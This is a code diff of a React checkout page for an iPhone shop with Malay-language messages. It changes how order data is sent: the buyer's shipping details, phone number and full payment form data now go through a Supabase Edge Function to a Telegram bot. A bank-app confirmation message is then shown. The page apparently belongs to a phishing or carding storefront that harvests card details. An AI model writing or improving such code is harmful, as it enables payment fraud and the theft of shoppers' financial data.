@@ -7,7 +7,8 @@ import ConfirmationSummary from '@/components/checkout/ConfirmationSummary.tsx';
 import PaymentForm from '@/components/checkout/PaymentForm.tsx';
 import PaymentProcessing from '@/components/checkout/PaymentProcessing.tsx';
 import BankAppConfirmationDialog from '@/components/checkout/BankAppConfirmationDialog.tsx';
-import { showSuccess, showError } from '@/utils/toast'; // Import showError
+import { showSuccess, showError } from '@/utils/toast';
+import { supabase } from '@/integrations/supabase/client'; // Import Supabase client
 
 export type ShippingDetails = {
   fullName: string;
@@ -35,12 +36,11 @@ const Checkout: React.FC = () => {
   const [showBankConfirmation, setShowBankConfirmation] = useState(false);
 
   if (!selectedIPhone) {
-    // Redirect to home or AppleDevices page if no iPhone is selected
     React.useEffect(() => {
       navigate('/devices/apple', { replace: true });
       showSuccess('Sila pilih peranti iPhone terlebih dahulu.');
     }, [navigate]);
-    return null; // Or a loading spinner/message
+    return null;
   }
 
   const handleShippingSubmit = (data: ShippingDetails) => {
@@ -56,28 +56,26 @@ const Checkout: React.FC = () => {
     setPaymentDetails(data);
     setCurrentStep('processing');
 
-    // Send data to backend after payment details are submitted
+    // Invoke Supabase Edge Function to send data to Telegram
     try {
-      const response = await fetch('http://localhost:3001/send-to-telegram', { // Gantikan dengan URL backend anda
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          phoneNumber: shippingDetails?.phoneNumber, // Menggunakan nombor telefon dari shippingDetails
+      const { data: functionData, error: functionError } = await supabase.functions.invoke('send-telegram-message', {
+        body: {
+          phoneNumber: shippingDetails?.phoneNumber,
           shippingDetails: shippingDetails,
           selectedIPhone: selectedIPhone,
-          paymentDetails: data, // Data pembayaran yang baru diisi
-        }),
+          paymentDetails: data,
+        },
       });
 
-      if (response.ok) {
-        showSuccess('Maklumat pesanan berjaya dihantar ke bot Telegram!');
-      } else {
+      if (functionError) {
+        console.error('Error invoking Edge Function:', functionError);
         showError('Gagal menghantar maklumat pesanan ke bot Telegram.');
+      } else {
+        console.log('Edge Function response:', functionData);
+        showSuccess('Maklumat pesanan berjaya dihantar ke bot Telegram!');
       }
     } catch (error) {
-      console.error('Ralat rangkaian atau pelayan backend:', error);
+      console.error('Network or unexpected error:', error);
       showError('Ralat sambungan. Sila cuba lagi.');
     }
   };
@@ -89,7 +87,7 @@ const Checkout: React.FC = () => {
   const handleBankConfirmationClose = () => {
     setShowBankConfirmation(false);
     showSuccess('Transaksi anda sedang menunggu pengesahan di aplikasi perbankan anda.');
-    navigate('/', { replace: true }); // Redirect to home after confirmation
+    navigate('/', { replace: true });
   };
 
   return (
